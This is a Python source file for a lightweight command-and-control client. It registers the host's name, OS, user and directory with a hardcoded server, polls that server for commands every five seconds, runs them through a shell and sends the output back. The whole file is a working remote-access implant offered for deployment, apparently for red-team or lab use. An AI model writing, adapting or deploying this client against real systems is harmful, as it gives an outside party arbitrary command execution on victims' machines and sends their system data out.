#!/usr/bin/env python3
"""
Lightweight Malformed Labs C2 Client
Minimal footprint client for quick deployment
"""

import urllib.request
import json
import subprocess
import threading
import time
import platform
import os
import sys

class LightClient:
    def __init__(self, c2_host="192.168.210.170", c2_port="8080"):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.client_id = f"{platform.node()}-{os.getpid()}"
        self.c2_url = f"http://{c2_host}:{c2_port}"
        self.running = True
        
    def execute(self, cmd):
        """Execute command and return result"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def register(self):
        """Register client with C2 server"""
        try:
            data = {
                "client_id": self.client_id,
                "hostname": platform.node(),
                "os": platform.system(),
                "arch": platform.machine(),
                "user": os.getenv("USER", "unknown"),
                "pwd": os.getcwd()
            }
            req = urllib.request.Request(
                f"{self.c2_url}/api/register",
                json.dumps(data).encode(),
                {"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
            return True
        except:
            return False
    
    def check_commands(self):
        """Check for and execute pending commands"""
        try:
            req = urllib.request.Request(f"{self.c2_url}/api/clients/{self.client_id}")
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read().decode())
            
            if data.get("commands"):
                for cmd_data in data["commands"]:
                    result = self.execute(cmd_data["command"])
                    
                    # Send result back
                    result_req = urllib.request.Request(
                        f"{self.c2_url}/api/results",
                        json.dumps({
                            "client_id": self.client_id,
                            "command_id": cmd_data["id"],
                            "result": result
                        }).encode(),
                        {"Content-Type": "application/json"}
                    )
                    urllib.request.urlopen(result_req, timeout=10)
        except:
            pass
    
    def run(self):
        """Main client loop"""
        print(f"[*] Light Client {self.client_id} connecting to {self.c2_url}")
        
        # Try to register
        if self.register():
            print(f"[+] Registered with C2 server")
        
        # Main loop
        while self.running:
            try:
                self.check_commands()
                time.sleep(5)
            except KeyboardInterrupt:
                print("\n[*] Client stopping...")
                break
            except:
                time.sleep(10)  # Longer sleep on errors

def main():
    if len(sys.argv) > 1:
        c2_host = sys.argv[1]
        c2_port = sys.argv[2] if len(sys.argv) > 2 else "8080"
    else:
        c2_host = "192.168.210.170"
        c2_port = "8080"
    
    client = LightClient(c2_host, c2_port)
    client.run()

if __name__ == "__main__":
    main()